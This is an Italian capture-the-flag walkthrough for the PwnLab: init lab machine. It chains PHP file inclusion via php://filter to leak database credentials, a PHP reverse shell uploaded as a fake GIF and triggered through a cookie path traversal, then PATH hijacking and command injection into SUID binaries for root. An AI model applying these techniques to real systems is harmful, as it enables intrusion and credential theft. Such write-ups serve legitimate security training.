# PWN_LAB INIT


## NETDISCOVER 👨‍💻

Eseguiamo un `netdiscover` per scoprire l'indirizzo ip della macchina 
```
netdiscover 10.211.55.0/24
Currently scanning: Finished! | Screen View: Unique Hosts
3 Captured ARP Req/Rep packets, from 2 hosts. Total size: 126
_____________________________________________________________________________ 
IP At MAC Address Count Len MAC Vendor / Hostname
----------------------------------------------------------------------------- 
10.211.55.1 00:1c:42:00:00:18 1 42 Parallels, Inc. 
10.211.55.17 00:1c:42:4d:69:40 2 84 Parallels, Inc.
```

Il primo indirizzo è il nostro (macchina kali), la macchina da attaccare é il secondo ip della lista.

## NMAP 🔍
```
nmap -A -T4 -sV -sC 10.211.55.17
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-16 15:02 CEST Nmap scan report for pwnlab-vulnhub.shared (10.211.55.17)
Host is up (0.00012s latency).
Not shown: 997 closed ports
PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian)
|_http-title: PwnLab Intranet Image Hosting
111/tcp open rpcbind 2-4 (RPC #100000)
| rpcinfo:
| program version port/proto service
...
3306/tcp open mysql MySQL 5.5.47-0+deb8u1
| mysql-info:
| Protocol: 10
| Version: 5.5.47-0+deb8u1
| Thread ID: 39
| Capabilities flags: 63487
| Some Capabilities: SupportsLoadDataLocal, Support41Auth, IgnoreSigpipes, SupportsTransactions, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, ConnectWithDatabase, InteractiveClient, FoundRows, Speaks41ProtocolNew, ODBCClient, SupportsCompression, LongPassword, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
| Status: Autocommit
| Salt: =sK^vV+r|=Vxyvdt;gv<
|_ Auth Plugin Name: mysql_native_password
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.71 seconds
```
`nmap` ci fornisce due informazioni importanti:
1. la porta `80` è aperta su un webserver Apache
2. la porta `3306` è aperta su un database MySQL

Visto che abbiamo trovato la porta _80_ aperta, apriamo l'url in un browser.

Il sito sembra molto semplice e molto spartano.

La pagina principale è `http://192.168.1.88/index.php`.

Sotto vediamo un format in cui si vedono una sezione **login** e una **upload**.
* la sezione _login_ presenta un form di accesso
* la sezione _upload_ permette di caricare file (il che ci fa capire dove potremmo agganciare la nostra _reverse shell_


## LOGIN PAGE 🛠

La cosa interessante da notare è che se clicchiamo nella sezione di login ci accorgiamo che non viene caricata una pagina nuova, ma la pagina è _inclusa_ in quella principale (un cosiddetto LFI - _Local FIle Inclusion_).

Ciò lo possiamo dedurre dal formato dell'url: http://192.168.1.88/**?page=login**

Questo fatto ci indirizza verso un possibile exploit nel lato _php_ ; la pagina principale include le altre in un modo che possiamo ipotizzare con

```php
include($_GET['page'] . '.php');
```
Se proviamo a passare qualsiasi cosa a `page= ` non vi viene restituito nulla.

Se in un terminale eseguiamo `curl http://192.168.1.88/?page=index` vediamo che abbiamo un loop ricorsivo della pagina di `index`, il che significa proprio che le pagine vengono incluse.

Abbiamo notato però che il codice php è interpretato dalla pagina; ecco perché se invochiamo `curl 'http://192.168.1.88/?page=index.php` vediamo semplicemente l'HTML della pagina ma non la parte php

Come possiamo però farci restituire il codice php delle varie pagine `config.php` `index.php`, etc ?

Una soluzione ci viene fornita grazie ai [*wrappers*](https://www.php.net/manual/en/wrappers.php) _stream php_ , funzioni usate nell'URL per trattare protocolli compatibili con il file system.
* **http://** sembra non funzionare perché proibito
* **php://** sembra promettente...

Con il wrapper _php_ possiamo usare la funzione **filter** per filtrare lo stream di dati che arrivano all'applicazione.

Nel nostro caso **non** vogliamo interpretare il codice di `index.php` o `config.php`, in modo da farcelo restituire.

Possiamo utilizzare la funzione `convert.base64-encode`. Mettendo tutto insieme otteniamo

1. index.php
```
curl -s http://10.211.55.17/?page=php://filter/convert.base64-encode/resource=index
```
2. config.php
```
curl -s http://10.211.55.17/?page=php://filter/convert.base64-encode/resource=config
```

Questo restituisce:
```html
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ] <hr/><br/> PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRS center>
</body>
</html>
```
Decodifichiamo:
```
echo "PD9waHANCiRzZXJ2ZXIJICA9I...lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVR" | base64 -d
```
Ottenendo il codice _php_ in chiaro (in questo caso mostriamo `index.php` e `config.php`):

1. index.php
```php
<?php
require("config.php");
$mysqli = new mysqli($server, $username, $password, $database);

if (isset($_GET['page']))
{
    include($_GET['page'].".php");
}

if (isset($_COOKIE['lang']))
{
    include("lang/".$_COOKIE['lang']);
}
?>
```

2. config.php
```php
<?php
$server = "localhost"; 
$username = "root"; 
$password = "H4u%QJ_H99"; 
$database = "Users";
?>
```

Il file `login.php` ci conferma le nostre ipotesi di inclusione precendetemente fatte; in più ci evidenzia un possibile _exploit_ con il cookie **lang**, oltre a richiedere la presenza del file `config.php`.

Il file `config.php` contiene le credenziali di accesso al database MySQL.
Proviamo ad entrare con queste credenziali:

`mysql -u root -p 'H4u%QJ_H99' -h 192.168.1.88`

```
Welcome to the MariaDB monitor. Commands end with ; or \g. Your MySQL connection id is 114764
Server version: 5.5.47-0+deb8u1 (Debian)
```
Siamo entrati. Vediamo un database `Users`:
```mysql
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Users              |
+--------------------+
2 rows in set (0.002 sec)
```
Accediamoci e guardiamo le tabelle
```
MySQL [(none)]> use Users;
...
MySQL [Users]> show tables;
+-----------------+
| Tables_in_Users |
+-----------------+
| users           |
+-----------------+
```
Facciamoci restituire tutto il contenuto di `users`
```
MySQL [Users]> Select * from users; 
+------+------------------+
| user | pass             | 
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== | 
| kane | aVN2NVltMkdSbw== | 
+------+------------------+
```
Anche le password sono codificate in base64.
Decodifichiamole e otteniamo:
1. JWzXuBJJNy
2. SIfdsTEn6I
3. iSv5Ym2GRo

Proviamo a loggarci con  
* user: `kent`  
* password: `JWzXuBJJNy`

[Eureka!](https://en.wikipedia.org/wiki/Eureka_(word)) Siamo loggati!

Vediamo se è possibile accedere direttamente al file system:
```mysql
MySQL [(none)]> show grants;
+------------------------------------------------------------------+
| Grants for root@%                                                |
+------------------------------------------------------------------+
| GRANT USAGE ON *.* TO 'root'@'%' IDENTIFIED BY PASSWORD <secret> |
| GRANT SELECT ON `Users`.* TO 'root'@'%'                          |
+------------------------------------------------------------------+
```
No, non è ancora possibile.

Se ricordiamo, nel sito c'era il file `upload.php`. 

Proviamo a caricare lì la nostra reverse shell, che sarà salvata in `upload/`.

Impossibile: possiamo caricare solo immagini come vediamo dal codice di `upload.pho`. Precisamente:
1. l'estensione del file può essere `jpg` `jpeg` `gif` `png`
2. Il tipo MIME deve contenere `image` e `\`
3. Il MIME compilato deve essere il risultato di una delle estensioni precendeti.

**Dobbiamo caricare la nostra reverse shell come una immagine**

Per fare questo, dobbiamo conoscere i cosiddetti [magic signature](https://en.wikipedia.org/wiki/List_of_file_signatures) di un'immagine.

Per esempio, per _GIF_ abbiamo `GIF87a` oppure `GIF89`.

## REVERSE SHELL 🔁
Eseguiamo i seguenti passaggi:

1. Per caricare la reverse shell, prendiamo una qualsiasi _reverse shell_ in php (se usate Kali */usr/share/webshells/php-reverse-shell.php*), modificando _IP_ e _porta_ con quelli della nostra macchina.

2. Aggiungiamo in testa la stringa `GIF89` e cambiamo l'estensione in `.gif`.

3. Carichiamo la reverse shell modificata nella cartella **/uploads** del browser.

4. Lanciamo `netcat` sulla nostra macchina con `nc -lvnp [port]`

### Sfruttare il COOKIE

_Triggeriamo_ la sessione utilizzando l'exploit del cookie che abbiamo visto nel file `index.php`

`curl 'http://192.168.1.88' -b 'lang=../upload/3eaa8ef68810b5720fdb48484d9b24ff.gif'`

Il nostro file _php_ prendeva come _cookie_ qualsiasi cosa con la fomra `lang=`, quindi basta passare il percorso della nostra "immagine" gif, e la reverse shell verrà eseguita.

```
GET / HTTP/1.1
Host: 10.211.55.17
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/ signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: lang=../upload/3eaa8ef68810b5720fdb48484d9b24ff.gif
If-None-Match: W/"17c7-5a5e2980343c0"
If-Modified-Since: Mon, 18 May 2020 02:05:15 GMT
Connection: close
```

## PRIVILEDGE ESCALATION 💵

La prima cosa da provare è il comando `su` con le varie credeziali degli utenti trovati nel database MySQL:

Username	Password	  Access ?
`kent`	`JWzXuBJJNy`	**OK**
`mike`	`SIfdsTEn6I`	_NO_
`kane`	`iSv5Ym2GRo`	**OK**

Facciamo un po' di ricerche all'interno della macchina con vari comandi, ad esempio:

* Inspect user files:
```
$ find / -user $USER -o -group $USER 2>/dev/null
```
* Check group ownership:
```
$ id
```
* Check running processes:
```
$ ps aux
```
* Check cron jobs:
```
$ crontab -l
$ ls /etc/cron*
```
* Enumerate SUIDs:
```
$ find / -type f -perm /ug=s -ls 2>/dev/null
```
* Check sudo grants:
```
$ sudo -l
```
* List local services:
```
$ ss -lpn
```
* Seek writable configuration files:
```
$ find /etc/ -writable 2>/dev/null
```
* ...

Dopo aver fatto un po' di ricerce vediamo che nella cartella _home_ dell'utente **kane** c'è un eseguibile [SUID](https://en.wikipedia.org/wiki/Setuid):
```
kane@pwnlab:~$ ls -l ~/msgmike
-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 /home/kane/msgmike
```
A questo punto possiamo:

1. lanciare [Ghidra](https://ghidra-sre.org/) per decompilare l'eseguibile
2. lanciare direttamente l'eseguibile per vedere se ne capiamo il comportamento.

### Da Kane a Mike

In entrambi i casi vediamo che l'eseguibile usa il comando `cat` per leggere un file di testo in ingresso.

`cat` è un comando [_exploitabile_](https://gtfobins.github.io/gtfobins/cat/#suid), quindi possiamo creare il nostro comando `cat` in cui inserire il nostro eseguibile per l'_escalation_ dei privilegi.

```
kane@pwnlab:~$ echo '/bin/bash' >cat
```
o
```
kane@pwnlab:~$ echo '/bin/sh' >cat
```
```
kane@pwnlab:~$ chmod +x cat
kane@pwnlab:~$ PATH="$PWD:$PATH" ./msgmike
mike@pwnlab:~$ id
uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)
```

### Da Mike a root

Notiamo che c'è un altro eseguibile interessante nella cartella `/home/mike`:
```
mike@pwnlab:/home/mike$ ls -l msg2root
-rwsr-sr-x 1 root root 5364 Mar 17  2016 msg2root
```

Effettuando il precedente controllo con Ghidra, o eseguendo direttamente il comando, vediamo che il file si aspetta qualcosa in ingresso da `stdin`:
```
mike@pwnlab:/home/mike$ ./msg2root
Message for root:
```

Proviamo a vedere se possiamo effettuare una **shell command injection**:
```
mike@pwnlab:/home/mike$ ./msg2root
Message for root: ;sh 
```
oppure
```
mike@pwnlab:/home/mike$ ./msg2root
Message for root: ;bash -p
```

NOTA:
1. Nel primo caso abbiamo usato il comando `sh`. Siamo stati fortunati che questa versione permette al semplice comando di non perdere i privilegi. Versioni più recenti non permettono questo tipo di escalation
2. Nel secondo caso, non è possibile utilizzare il comando `bash` da solo. Senza l'opzione `-p`, i permessi di _effective ID_ e _real ID_ verrebbero resettati, rendendo vano il tentativo di diventare _root_ (Vedere il manuale di Bash).

```
bash-4.3# id
uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)
```

## ROOT FLAG 🏴‍☠️

Andiamo a prenderci la flag di ROOT!

```
bash-4.3# /bin/cat /root/flag.txt
.-=~=-.                                                                 .-=~=-.
(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
(_ ___)  _____                             _                            (_ ___)
(__  _) /  __ \                           | |                           (__  _)
( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)
(__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)
(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)
(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)
( _ __)                     __/ |                                       ( _ __)
(__  _)                    |___/                                        (__  _)
(__  _)                                                                 (__  _)
(_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)
( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)
(__  _) this challenge.                                                 (__  _)
(_ ___)                                                                 (_ ___)
( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
(__  _) reading it                                                      (__  _)
(__  _)                                                                 (__  _)
(__  _)                                             For sniferl4bs.com  (__  _)
( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
(__  _)                                                                 (__  _)
(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
`-._.-'                                                                 `-._.-'
```

#### TODO extra exploitation
